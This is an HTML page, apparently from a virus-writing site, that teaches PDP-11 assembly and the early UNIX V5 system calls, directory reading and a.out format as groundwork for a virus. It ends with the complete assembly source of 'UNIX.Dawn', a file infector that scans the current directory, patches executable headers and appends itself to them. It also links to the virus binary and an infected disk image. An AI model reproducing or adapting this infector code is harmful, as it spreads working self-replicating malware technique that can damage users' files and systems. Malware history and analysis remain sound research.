+The PDP-11 was a series of 16-bit minicomputers sold by Digital Equipment Corp. in the 1970s and 1980s. The PDP-11 was a successor to DEC's PDP-8 computer in the PDP series of computers. It had several uniquely innovative features, and was easier to program than its predecessors. While well-liked by programmers, it was replaced in the mid-range minicomputer niche by the VAX-11 32-bit extension of the PDP-11. Much of the market for both machines would be taken by personal computers, including the IBM PC and Apple II, and workstations, such as those from Sun Microsystems.
+<br clear="left"/>
+<h4>Registers</h4>
+<p>There are five general registers (from R0 to R5), stack pointer (R6 or SP) and program counter (R7 or PC)</p>
+<h4>Addressing modes</h4>
+<table border="1" summary="PDP-11 Addressing Modes">
+<tr><th colspan="3">Basic addressing modes</th></tr>
+<tr><th>Name</th><th>Syntax</th><th>Effect</th></tr>
+<tr><td>Register </td><td>Rn </td><td>op = Rn</td></tr>
+<tr><td>Register Deferred </td><td>(Rn) </td><td>op = mem[Rn]</td></tr>
+<tr><td>Autoincrement </td><td>(Rn)+ </td><td>op = mem[Rn] / inc Rn</td></tr>
+<tr><td>Autoincrement Deferred </td><td>@(Rn)+ </td><td>addr = mem[Rn] / inc Rn / op = mem[addr]</td></tr>
+<tr><td>Autodecrement </td><td>-(Rn) </td><td>dec Rn / op = mem[Rn]</td></tr>
+<tr><td>Autodecrement Deferred </td><td>@-(Rn) </td><td>dec Rn / addr = mem[Rn] / op = mem[addr]</td></tr>
+<tr><td>Index </td><td>x(Rn) </td><td>x = mem[PC] / inc PC / op = mem[x + Rn]</td></tr>
+<tr><td>Index Deferred </td><td>@x(Rn) </td><td>x = mem[PC] / inc PC / addr = mem[x + Rn] / op = mem[addr]</td></tr>
+<tr><th colspan="3">PC Addressing modes</th></tr>
+<tr><td>Immediate </td><td>#n </td><td>op = mem[PC] / inc PC</td></tr>
+<tr><td>Absolute </td><td>@#n </td><td>addr = mem[PC] / inc PC / op = mem[addr]</td></tr>
+<tr><td>Relative </td><td>n </td><td>x = mem[PC] / inc PC / op = mem[x + PC]</td></tr>
+<tr><td>Relative Deferred </td><td>@n </td><td>x = mem[PC] / inc PC / addr = mem[x + PC] / op = mem[addr]</td></tr>
+</table>
+<p><em>Autoincrement and autodecrement modes change the register contents by one for byte instructions and two for word instructions with the following exceptions:</em></p>
+<ol>
+<li><em>R6 and R7 are always changed by 2.</em></li>
+<li><em>In deferred modes, a register is always incremented by 2.</em></li>
+</ol>
+<h3>Instruction summary</h3>
+<p>The following is a brief instruction summary extracted from [3]. Refer to [3] for explanations of operation of these instructions or to [3,4] for opcodes.</p>
+<pre style="font-size: 8pt;">
+CLR(B)  clear destination			 BHI     branch if higher (unsigned)
+COM(B)  complement destination                   BLOS    branch if lower or same
+INC(B)  increment destination                    BHIS    branch if higher or same
+DEC(B)  decrement destination                    BLO     branch if lower
+NEG(B)  negate destination                       JMP     jump
+TST(B)  test destination                         JSR     jump to subroutine
+ASR(B)  arithmetic shift right                   RTS     return from subroutine
+ASL(B)  arithmetic shift left                    MARK    mark
+ROR(B)  rotate right                             SPL     set priority level
+ROL(B)  rotate left                              EMT     emulator trap
+SWAB    swap bytes                               TRAP    trap
+ADC(B)  add carry                                BPT     breakpoint trap
+SBC(B)  subtract carry                           IOT     input/output trap
+SXT     sign extend                              RTI     return from interrupt
+MFPS    move byte from PS                        RTT     return from interrupt
+MTPS    move byte to PS                          HALT    halt
+MOV(B)  move source to destination               WAIT    wait for interrupt
+CMP(B)  compare src to dst                       RESET   reset external bus
+ADD     add src to dst                           CLC     clear C
+SUB     subtract src from dst                    CLV     clear V
+BIT(B)  bit test                                 CLZ     clear Z
+BIC(B)  bit clear                                CLN     clear N
+BIS(B)  bit set                                  CCC     clear all CC bits
+BR      branch (unconditional)                   SEC     set C
+BNE     branch if not equal (to zero)            SEV     set V
+BEQ     branch if equal (to zero)                SEZ     set Z
+BPL     branch if plus                           SEN     set N
+BMI     branch if minus                          SCC     set all CC bits
+BVC     branch if overflow is clear              NOP     no operation
+BVS     branch if overflow is set                MUL     multiply
+BCC     branch if carry is clear                 DIV     divide
+BCS     branch if carry is set                   ASH     shift arithmetically
+SOB     subtract one and branch (if !=0)         ASHC    arithmetic shift combined
+(signed branches)				 XOR     exclusive or
+BGE     branch is greater than or equal (to zero)FADD    floating add
+BLT     branch if less than (zero)               FSUB    floating subtract
+BGT     branch if greater than (zero) 		 FMUL    floating multiply
+BLE     branch if less than or equal (to zero)   FDIV    floating divide
+</pre>
+<h3>Calling the system</h3>
+<p>Let's start from some trivial example like "Hello, world!":</p>
+<pre>
+/ write(1, "Hello, world!\n", 14);
+	mov	$1,r0
+	sys	write; 1f; 2f-1f
+/ exit(0);
+	clr	r0
+	sys	exit			
+1:	&lt;Hello, world!\n>
+2:
+
+# cat ->1.s
+/ write(1, "Hello, world!\n", 14);
+        mov     $1,r0
+	...and so on...
+^D
+# as 1.s
+# ./a.out
+Hello, world!
+#
+</pre>
+<p>As you can see there is a mixed calling convention used, one argument (a file handle) is passed via R0 register and the rest arguments stored right after the "sys write" pseudo-instruction. You can find all neccessary information in the section 2 of man, but you have to use the manual from 4th or 6th version, since the 5th edition of the manual was lost.</p>
+<h3>Position independent code</h3>
+<p>The previous example showed that many system calls requires absolute addresses as arguments and this is absolutely inappropriate for the virus. To use the arguments of the syscalls calculated at runtime we need self-modifying code. But this will cause problems with memory protection of the text segment. To solve this problem the regular programms use indir(2) syscall. Suppose that we are going to write the contents of the buffer pointer to which stored in the R4 register and the size of buffer in R5:</p>
+<pre>
+	mov	r4,1f
+	mov	r5,1f+2
+	sys	indir; 0f
+	.data
+0:	sys	write; 1:0; 0
+	.text
+</pre>
+<p>What good for the regular application will not satisfy us. The above tricky syscall was used to keep the .text clean and this is the last thing we should bother, so we will determine our own address and will modify the syscalls directly:</p>
+<pre>
+/ we live in the .data segment
+	mov	pc,r3
+	tst	-(r3)
+	/ r3 contains the address of the start
+	mov	r3,r4
+	add	$9f,r4
+	...
+	mov	r4,1f
+	mov	r4,2f
+	...
+	sys	read; 1:0; 20.	
+	...
+	sys	write;2:0; 20.
+	...
+/ bss immediately follows the .data
+9:
+/ we will keep our temporaries here
+</pre>
+<p>Note the decimal point after "20.". By default all numbers are octal.</p>
+<p>Here is the program that:</p>
+<pre>
+/ dumps its own code to the file
+	mov	pc, r4			/ addr of the next instr into R4
+	tst	-(r4)			/ R4 -= 2 (our start in memory)
+	mov	r4,r0
+	add	$name,r0	
+	mov	r0,1f			/ store addr of name at label 1
+	add	$[mesg-name],r0
+	mov	r0,3f			/ store addr of mesg at label 3
+	
+	mov	r4,2f			/ set buffer address for write
+	sys	creat; 1:0; 444		/ r0 = creat(name, 0444);
+	bes	error			/ if (r0 &lt; 0) goto error;
+	mov	r0,r1			/ save handle
+	sys	write; 2:0; 9f		/ write(r0, start, size_of_dcf)
+	bes	error
+	mov	r1,r0			/ restore handle
+	sys	close			/ close(r0);
+	br	_exit			/ goto exit;
+error:	mov	$1,r0
+	sys	write; 3:0; 9f-mesg	/ write(1, mesg, sz_mesg);
+_exit:	clr	r0
+	sys	exit			/ exit(0);
+	.data
+name:	&lt;dcf2\0>
+mesg:	&lt;Unable to create the file!\n>
+9:
+
+# as dcf.s
+# ./a.out
+# od dcf2
+0000000 010704 005744 010400 062700 000100 010067 000016 062700
+0000020 000005 010067 000042 010467 000014 104410 000100 000444
+0000040 103410 010001 104404 000000 000140 103403 010100 104406
+0000060 000405 012700 000001 104404 000105 000033 005000 104401
+0000100 061544 031146 052400 060556 066142 020145 067564 061440
+0000120 062562 072141 020145 064164 020145 064546 062554 005041
+0000140 
+#
+</pre>
+<h3>Reading directory</h3>
+<p>We will read directory in the same way as in the contemporary UNIX systems. Since "all is file" we will open the current directory "." with <tt>open</tt> and <tt>read</tt> it:</p>
+<pre>
+# od -c .
+0000000 \? \0  .  . \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0
+0000020 \? \0  . \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0
+0000040 \? \0  b  i  n \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0
+0000060  &lt; \0  d  e  v \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0
+0000100  @ \0  e  t  c \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0
+0000120  M \0  l  i  b \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0
+0000140  Z \0  m  n  t \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0
+0000160  [ \0  t  m  p \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0
+0000200 \\ \0  u  s  r \0 \0 \0 \0 \0 \0 \0 \0 \0 \0 \0
+0000220  q \?  u  n  i  x \0 \0 \0 \0 \0 \0 \0 \0 \0 \0
+</pre>
+<p>Directory entry consist of inode at offset 0 and filename located at offset 2.</p>
+<pre>
+/ ls -1
+	.text
+        sys     open; dot; 0
+        bes     error
+	mov     r0,r1
+0:	mov	r1,r0
+	sys	read; buf; 16.
+	bes	error
+	tst	r0
+	ble	1f
+	mov	$buf,r2
+	tst	(r2)+
+3:	movb	(r2)+,r0
+	beq	2f
+	jsr	pc,putc
+	br	3b
+2:	mov	$10.,r0
+	jsr	pc,putc
+	br	0b
+1:      mov     $0, r0
+        sys     exit
+putc:	movb	r0, dot
+	mov	$1, r0
+	sys	write; dot; 1
+	rts	pc
+error:	mov	$1, r0
+	sys	write; 1f; 7
+	br	1b
+1:	&lt;error!\n>
+	.data
+dot:	&lt;.\0>
+buf:	.=.+16.
+
+</pre>
+<p>It isn't neccessary to keep the "." string. <code>open(0,0)</code> will open current directory for reading. So we can rewrite the above example as follows:</p>
+<pre>
+	...
+	br	1b
+1:	&lt;error!\n>
+<strong>	.bss
+dot:	.=.+2
+buf:	.=.+16.</strong>
+</pre>
+<pre>
+# ./apout ./a.out 
+Binary: V5
+.
+..
+doc
+V5
+dist
+v5root
+dv
+ls.s
+....
+</pre>
+<h3>The a.out format</h3>
+<p>Description of the a.out binaries located in the a.out(5), and after you had made a break for reading it and return to this paper, we will look now at the as(1) output from the previous chapter:</p>
+<pre>
+# strip a.out 
+# od a.out
+0000000 000407 000034 000000 000000 000000 000000 000000 000001
+0000020 012700 000001 104404 000016 000016 005000 104401 062510
+0000040 066154 026157 073440 071157 062154 005041
+</pre>
+<p>Obviously, the a.out file is executable with R/W .text segment (magic 0407 at offset 0, btw, note that all magic numbers are indeed PDP-11 BRanch instructions), no .data and .bss segments present, no symbol table and rellocation information (words at offset 6 and 14 respectively). The entry point field will not be used until version 7 and in version 5 is always equal to zero:</p>
+<pre>u.u_ar0[R7] = 0;	/* /usr/sys/ken/sys1.c:42 */</pre>
+<p>I think that the things presented above are relatively simple, so enough of details let's look into code.</p>
+</div>
+<div id="src" class="content">
+<h2>The source code</h2>
+<pre><em>/ UNIX.Dawn</em>
+	jmp	0f
+0:
+	mov	pc,r3		<em>/ setup and restore victim</em>
+	cmp	-(r3),-(sp)	<em>/ r3=start &amp; word for MARK</em>
+	mov	r3,r4
+	add	$8f-4,r4
+	mov	(r4)+,(r1)+
+	mov	(r4)+,(r1)+
+	mov	$167,r5	
+	mov	r4,1f
+	mov	r4,2f
+	mov	r4,4f	
+	mov	r3,5f
+	mov	r4,6f
+	
+	sys	open; 1:0; 0	<em>/ open cur dir</em>
+	bes	done
+	mov	r0,-(sp)	<em>/ push handle</em>
+loop:	
+	mov	(sp),r0		<em>/ read dir</em>
+	sys	read; 2:0; 16.
+	tst	r0
+	ble	cdir
+	mov	r4,r2		<em>/ open victim</em>
+	tst	(r2)+
+	mov	r2,3f
+	sys	open; 3:0; 2
+	bes	loop
+	mov	r0,-(sp)
+	sys	read; 4:0; 20.	<em>/ read header</em>
+	bes	next
+
+	cmp	$407,(r4)	<em>/ is R/W .text executable?</em>
+	bne	next
+	mov	(r2)+,r0	<em>/ .text size</em>
+	add	(r2),r0		<em>/ .data size</em>
+	sub	r1,r0
+	add	$8f,(r2)+	<em>/ adjust .data size</em>
+	add	$46.,(r2)+	<em>/ adjust .bss size</em>
+	tst	(r2)+		<em>/ size of symbol table==0?</em>
+	bne	next
+	add	r1,r2		<em>/ skip two empty fields...</em>
+	tst	(r2)+		<em>/ relocation info stripped</em>
+	beq	next
+	cmp	r5,(r2)		<em>/ there is the jmp at start</em>
+	beq	next
+	sub	r1,r4
+	mov	(r2),(r4)+	<em>/ save first 2 words</em>
+	mov	r5,(r2)+
+	mov	(r2),(r4)+
+	mov	r0,(r2)+
+	
+	mov	(sp),r0		<em>/ write body</em>
+	sys	seek; 0; 2
+<em>// no bcs, C is set on EBADF/ESPIPE [fio.c:24, sys2.c:135]</em>
+	mov	(sp),r0
+	sys	write; 5:0; 9f-4
+	bes	next
+	mov	(sp),r0		<em>/ write header</em>
+	sys	seek; 0; 0
+	mov	(sp),r0
+	sys	write; 6:0; 20.
+next:
+	mov	(sp)+,r0	<em>/ close vic</em>
+	sys	close
+	br	loop
+cdir:
+	mov	(sp)+,r0	<em>/ close dir</em>
+	sys	close
+done:
+	mov	$006400,-(sp)	<em>/	mark	0</em>
+	mov	$077502,-(sp)	<em>/	sob	r5,0b</em>
+	mov	$005023,-(sp)	<em>/0:	clr	(r3)+</em>
+	mov	sp,pc
+8:
+	clr	r0		<em>/ fake host</em>
+	sys	exit
+	.bss
+9:	.=.+20.</pre>
+</div>
+<div id="ref" class="content">
+<h2>References</h2>
+<ol>
+ <li>Dennis M. Ritchie "Assembler Reference Manual", November 2, 1997</li>
+ <li>Dennis M. Ritchie and Ken Thompson "<a href="http://cm.bell-labs.com/cm/cs/who/dmr/cacm.html">The UNIX TimeSharing System</a>", Communications of the ACM, July 1974 Volume 17 Number 7</li>
+ <li>PDP-11 Processor Handbook, DEC</li>
+ <li>PDP-11 Programming Card</li>
+ <li>SIMH (<a href="http://simh.trailing-edge.com/">http://simh.trailing-edge.com/</a>)</li>
+ <li>PDP Unix Preservation Society (<a href="http://minnie.tuhs.org/PUPS/">http://minnie.tuhs.org/PUPS/</a>)</li>
+ <li>J. Lions "Lions' Commentary on UNIX 6th Edition, with Source Code", 1976</li>
+</ol>
+</div>
+<div id="files" class="content">
+<h2>Files</h2>
+<ul>
+<li><a href="files/correspondence.mbox.gz">All mail sent and received from AV-vendors</a> (gzipped mbox, 184K)</li>
+<li>The Dawn <a href="files/dawn.zip">source code</a> (zip, 1.5K), <a href="files/dawn.bin">binary</a> (0.2K) and <a href="files/infected.img.bz2">fs image</a> (bzip, 716K)</li>
+<li><a href="files/virus_files.zip">Files</a> sent to AV companies (disasm, samples, dumps and "screenshots" - zip, 16K)</li>
+<li>The <a href="files/apout.diff">patch</a> for APOUT (diff, 3K)</li>
+<li><a href="files/od2bin.c">od2bin.c</a> - convert octal dump produced by od to binary (0.5K)</li>
+<li><a href="files/samples.zip">Sample UNIX programs</a> - dcf, ls, hello (assembly sources and binary - zip, 1.5K)</li>
+</ul>
+</div>
+</div> 
+<div class="buttons">
+<a href="http://validator.w3.org/check?uri=referer"><img src="img/valid-xhtml10.png" alt="Valid XHTML 1.0!" height="31" width="88" border="0"/></a>
+<a href="http://vxer.org/"><img src="img/vxh.gif" alt="VX Heavens" title="VX Heavens" border="0"/></a>
+<a href="http://gimp.org/"><img src="img/gimp.gif" alt="GFX by GIMP!" border="0"/></a>
+<a href="http://www.xaraxtreme.org/"><img src="img/xara.gif" alt="Xara Extreme" border="0"/></a>
+</div>
+<script>/* <![CDATA[ */(function(d,s,a,i,j,r,l,m,t){try{l=d.getElementsByTagName('a');t=d.createElement('textarea');for(i=0;l.length-i;i++){try{a=l[i].href;s=a.indexOf('/cdn-cgi/l/email-protection');m=a.length;if(a&&s>-1&&m>28){j=28+s;s='';if(j<m){r='0x'+a.substr(j,2)|0;for(j+=2;j<m&&a.charAt(j)!='X';j+=2)s+='%'+('0'+('0x'+a.substr(j,2)^r).toString(16)).slice(-2);j++;s=decodeURIComponent(s)+a.substr(j,m-j)}t.innerHTML=s.replace(/</g,'&lt;').replace(/\>/g,'&gt;');l[i].href='mailto:'+t.value}}catch(e){}}}catch(e){}})(document);/* ]]> */</script></body>
+</html>
